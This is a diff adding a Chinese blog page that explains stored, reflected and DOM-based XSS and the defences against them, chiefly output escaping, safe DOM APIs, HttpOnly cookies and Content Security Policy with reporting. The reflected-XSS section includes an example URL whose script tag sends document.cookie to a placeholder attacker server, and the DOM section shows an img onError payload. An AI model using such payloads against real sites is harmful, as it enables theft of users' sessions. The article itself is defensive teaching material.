@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/img/16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/img/32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/img/16x16.png">
+  <link rel="mask-icon" href="/img/logo.png" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lirifa.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#2bb5d4","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"livere","storage":true,"lazyload":false,"nav":null,"activeClass":"livere"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="什么是XSS及XSS基本防护手段">
+<meta property="og:url" content="https://lirifa.github.io/posts/2237264357/index.html">
+<meta property="og:site_name" content="Rafa&#39;s Blog">
+<meta property="og:description" content="XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-30T03:40:46.000Z">
+<meta property="article:modified_time" content="2022-03-30T03:40:46.000Z">
+<meta property="article:author" content="Rafa">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://lirifa.github.io/posts/2237264357/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>什么是XSS及XSS基本防护手段 | Rafa's Blog</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e65b95711a0ae7fa2a5d53e3186cff24";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Rafa's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">角落</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lirifa.github.io/posts/2237264357/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/44889418?v=4">
+      <meta itemprop="name" content="Rafa">
+      <meta itemprop="description" content="角落">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Rafa's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          什么是XSS及XSS基本防护手段
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-30 11:40:46" itemprop="dateCreated datePublished" datetime="2022-03-30T11:40:46+08:00">2022-03-30</time>
+            </span>
+
+          
+            <div class="post-description">XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="什么是XSS？"><a href="#什么是XSS？" class="headerlink" title="什么是XSS？"></a>什么是XSS？</h1><p>XSS（Cross-Site Scripting）是一种跨站脚本攻击，攻击者通过在目标网站上注入恶意脚本，导致用户在访问该网站时执行恶意代码。<br>这些恶意脚本可以包括但不限于：获取用户信息、窃取token&#x2F;cookie、修改用户数据、重定向用户到恶意网站等。</p>
+<h1 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h1><ul>
+<li>存储型XSS</li>
+<li>反射型XSS</li>
+<li>DOM型XSS</li>
+</ul>
+<h2 id="存储型-XSS（持久型）"><a href="#存储型-XSS（持久型）" class="headerlink" title="存储型 XSS（持久型）"></a>存储型 XSS（持久型）</h2><p>攻击流程：</p>
+<ol>
+<li>攻击者在可提交内容的地方（评论、留言、昵称、个人简介）提交一段恶意 JS 代码。</li>
+<li>后端没过滤，直接存进数据库。</li>
+<li>其他用户打开这个页面时，后端把恶意代码从数据库取出来，直接渲染到页面。</li>
+<li>浏览器执行这段 JS，完成攻击。</li>
+</ol>
+<p>一句话总结：代码存数据库 → 所有人访问都中招 → 危害最大。</p>
+<h2 id="反射型-XSS（非持久型）"><a href="#反射型-XSS（非持久型）" class="headerlink" title="反射型 XSS（非持久型）"></a>反射型 XSS（非持久型）</h2><p>攻击流程：</p>
+<ol>
+<li>攻击者构造一个<strong>带恶意代码的 URL</strong>  比如：<code>https://xxx.com/search?q=&lt;script&gt;fetch(&#39;https://攻击者服务器/steal?c=&#39;+document.cookie)&lt;/script&gt;</code>。</li>
+<li>诱导用户点击这个链接。</li>
+<li>后端把 URL 里的参数直接 “反射” 回页面（比如搜索框提示、报错信息）。</li>
+<li>浏览器执行 JS，完成攻击。</li>
+</ol>
+<p>一句话总结：代码在 URL 里 → 点链接才中招 → 不存库，一次性。</p>
+<h2 id="DOM-型-XSS（前端型）"><a href="#DOM-型-XSS（前端型）" class="headerlink" title="DOM 型 XSS（前端型）"></a>DOM 型 XSS（前端型）</h2><p>攻击流程：</p>
+<ol>
+<li>攻击者同样构造带恶意代码的 URL。</li>
+<li>用户点击链接。</li>
+<li>后端不参与，前端 JS 直接从 URL 取参数，用 innerHTML、document.write、eval 等方式直接插入 DOM。</li>
+<li>浏览器执行 JS，完成攻击。</li>
+</ol>
+<p>一句话总结：全程前端操作 DOM → 不经过后端、不进数据库 → 最隐蔽。</p>
+<blockquote>
+<p>随着浏览器对浏览器安全的发展重视，DOM 型 XSS 攻击的难度增加，但是仍然存在。<br>比如：插入一个<code>&lt;script&gt;</code>标签，<strong>现代</strong>浏览器可能不会执行这个标签里的代码，但是<strong>旧版</strong>浏览器还是会执行。<br>比如：插入一个<code>&lt;img src=&quot;xxx&quot; onError=&quot;alert(&#39;xss&#39;)&quot;&gt;</code>标签，给标签注册一个onError事件，当图片加载失败时执行恶意代码。</p>
+</blockquote>
+<h1 id="三者最核心区别"><a href="#三者最核心区别" class="headerlink" title="三者最核心区别:"></a>三者最核心区别:</h1><p>存储型：恶意代码存在数据库<br>反射型：恶意代码在URL，后端参与渲染<br>DOM 型：恶意代码在URL，前端直接操作 DOM，后端无感</p>
+<h1 id="XSS基本防护手段"><a href="#XSS基本防护手段" class="headerlink" title="XSS基本防护手段"></a>XSS基本防护手段</h1><ol>
+<li>输入验证：对用户输入进行验证，只允许输入安全的字符。</li>
+<li>输出转义：对用户输入进行转义，防止浏览器执行恶意代码。</li>
+<li>使用安全的API：避免使用 innerHTML、document.write 等 API，改用 innerText、textContent 等安全 API。</li>
+<li>开启 CSP 内容安全策略</li>
+<li>Cookie 设置 HttpOnly、Secure</li>
+<li>本地存储（localStorage、sessionStorage）不存储用户敏感信息</li>
+</ol>
+<h1 id="CSP-内容安全策略"><a href="#CSP-内容安全策略" class="headerlink" title="CSP 内容安全策略"></a>CSP 内容安全策略</h1><p>CSP（Content Security Policy）是一种用于防止 XSS 攻击的机制，通过指定允许加载的资源来源，来限制浏览器执行的代码。</p>
+<h2 id="开启方式"><a href="#开启方式" class="headerlink" title="开启方式"></a>开启方式</h2><ol>
+<li>在 HTML 头部添加 meta 标签，指定 CSP 政策。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span></span></span><br><span class="line"><span class="tag">  <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com;&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li>在 HTTP 头中添加 CSP 头。<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 普通限制（强制执行）</span><br><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://cdn.example.com;</span><br><span class="line"></span><br><span class="line">2. 仅报告不拦截（调试用）</span><br><span class="line"><span class="attribute">Content-Security-Policy-Report-Only</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; ...</span><br></pre></td></tr></table></figure>
+<strong>注意：</strong></li>
+</ol>
+<ul>
+<li>优先使用http头开启CSP，因为meta标签： <ul>
+<li>不支持 frame-ancestors、report-uri、sandbox 部分属性</li>
+<li>不能使用 Content-Security-Policy-Report-Only</li>
+<li>有可能被浏览器插件拦截删除</li>
+</ul>
+</li>
+</ul>
+<h2 id="常用指令含义"><a href="#常用指令含义" class="headerlink" title="常用指令含义"></a>常用指令含义</h2><ul>
+<li>default-src ‘self’：默认只加载同域资源</li>
+<li>script-src：限制 JS 来源</li>
+<li>style-src：限制 CSS</li>
+<li>img-src：限制图片</li>
+<li>connect-src：限制 fetch&#x2F;axios&#x2F;ajax 请求</li>
+<li>frame-src：限制 iframe</li>
+<li>object-src ‘none’：禁止插件（Flash 等）</li>
+<li>frame-ancestors ‘none’：防止被 iframe 嵌套（防点击劫持）</li>
+<li>unsafe-inline：允许内联 script&#x2F;style</li>
+<li>unsafe-eval：允许 eval，尽量别开</li>
+</ul>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>:</span><br><span class="line">  default-src &#x27;self&#x27;;</span><br><span class="line">  script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; https://cdn.bootcdn.net;</span><br><span class="line">  style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;</span><br><span class="line">  img-src &#x27;self&#x27; data: https://*.aliyuncs.com;</span><br><span class="line">  font-src &#x27;self&#x27;;</span><br><span class="line">  connect-src &#x27;self&#x27; https://api.example.com;</span><br><span class="line">  frame-src &#x27;none&#x27;;</span><br><span class="line">  object-src &#x27;none&#x27;;</span><br><span class="line">  base-uri &#x27;self&#x27;;</span><br><span class="line">  form-action &#x27;self&#x27;;</span><br><span class="line">  report-uri /csp-report-endpoint;</span><br></pre></td></tr></table></figure>
+
+<h2 id="CSP-报告"><a href="#CSP-报告" class="headerlink" title="CSP 报告"></a>CSP 报告</h2><p>CSP 上报主要用于调试策略、发现违规资源、监控潜在攻击，在不影响业务的情况下收集违规日志，帮助安全加固和问题排查。</p>
+<ol>
+<li><p>上线前灰度验证<br> 先开启 Content-Security-Policy-Report-Only 只上报、不拦截，收集页面所有资源加载情况，看哪些资源不符合策略，避免直接上线导致页面瘫痪。</p>
+</li>
+<li><p>发现遗漏的非法资源<br> 线上环境如果出现未授权脚本、图片、接口请求，CSP 会自动上报，帮助定位潜在 XSS 攻击、非法资源引入。</p>
+</li>
+<li><p>监控安全违规行为<br> 报告里会包含违规资源地址、触发位置、页面 URL，可用于安全审计、追溯攻击来源。</p>
+</li>
+<li><p>逐步收紧安全策略<br> 从宽松策略逐步收紧，通过报告观察影响，在不影响业务的前提下提升安全性。</p>
+</li>
+</ol>
+<h2 id="设置-CSP-报告-URI-主要有两种方式："><a href="#设置-CSP-报告-URI-主要有两种方式：" class="headerlink" title="设置 CSP 报告 URI 主要有两种方式："></a>设置 CSP 报告 URI 主要有两种方式：</h2><ol>
+<li>使用传统 report-uri（兼容旧版浏览器） 在 HTTP 响应头 Content-Security-Policy 中配置：</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; report-uri /csp-report-endpoint;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>report-uri：指定浏览器发送违规报告的 POST 地址，支持相对路径或绝对 URL</li>
+<li>注意：CSP 3 已弃用，但兼容性最好，生产环境建议保留</li>
+</ul>
+<ol start="2">
+<li>现代 report-to（CSP 3 标准，推荐），需先通过 Reporting-Endpoints 定义上报端点，再在 CSP 中引用</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 1. 定义上报端点（Reporting-Endpoints）</span><br><span class="line"><span class="attribute">Reporting-Endpoints</span><span class="punctuation">: </span>csp-endpoint=&quot;https://your-domain.com/csp-reports&quot;</span><br><span class="line"></span><br><span class="line"># 2. 在 CSP 中引用端点</span><br><span class="line"><span class="attribute">Content-Security-Policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; report-to csp-endpoint;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>优势：支持多端点、批量上报，符合最新标准。</li>
+<li>兼容：现代浏览器支持，旧版浏览器可同时配置 report-uri 做降级</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/3399588538/" rel="prev" title="LeetCode学习计划Day7（滑动窗口）">
+      <i class="fa fa-chevron-left"></i> LeetCode学习计划Day7（滑动窗口）
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    
+  <div class="comments">
+    <div id="lv-container" data-id="city" data-uid="MTAyMC82MDk1Ni8zNzQyNg=="></div>
+  </div>
+  
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXSS%EF%BC%9F"><span class="nav-text">什么是XSS？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E7%B1%BB%E5%9E%8B"><span class="nav-text">XSS类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS%EF%BC%88%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-text">存储型 XSS（持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-XSS%EF%BC%88%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8B%EF%BC%89"><span class="nav-text">反射型 XSS（非持久型）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DOM-%E5%9E%8B-XSS%EF%BC%88%E5%89%8D%E7%AB%AF%E5%9E%8B%EF%BC%89"><span class="nav-text">DOM 型 XSS（前端型）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E8%80%85%E6%9C%80%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="nav-text">三者最核心区别:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS%E5%9F%BA%E6%9C%AC%E9%98%B2%E6%8A%A4%E6%89%8B%E6%AE%B5"><span class="nav-text">XSS基本防护手段</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CSP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5"><span class="nav-text">CSP 内容安全策略</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E6%96%B9%E5%BC%8F"><span class="nav-text">开启方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E5%90%AB%E4%B9%89"><span class="nav-text">常用指令含义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CSP-%E6%8A%A5%E5%91%8A"><span class="nav-text">CSP 报告</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E7%BD%AE-CSP-%E6%8A%A5%E5%91%8A-URI-%E4%B8%BB%E8%A6%81%E6%9C%89%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="nav-text">设置 CSP 报告 URI 主要有两种方式：</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Rafa"
+      src="https://avatars.githubusercontent.com/u/44889418?v=4">
+  <p class="site-author-name" itemprop="name">Rafa</p>
+  <div class="site-description" itemprop="description">角落</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/lirifa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;lirifa" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:rafa_im@163.com" title="E-Mail → mailto:rafa_im@163.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Rafa</span>
+</div>
+
+        
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1279481956&web_id=1279481956"></script>
+  </div>
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="100" alpha="0.3" zIndex="-1" src="//cdn.jsdelivr.net/gh/theme-next/theme-next-canvas-ribbon@1/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+NexT.utils.loadComments(document.querySelector('#lv-container'), () => {
+  window.livereOptions = {
+    refer: location.pathname.replace(CONFIG.root, '').replace('index.html', '')
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":160,"height":280},"mobile":{"show":false},"react":{"opacityDefault":1,"opacityOnHover":1},"log":false,"tagMode":false});</script></body>
+</html>
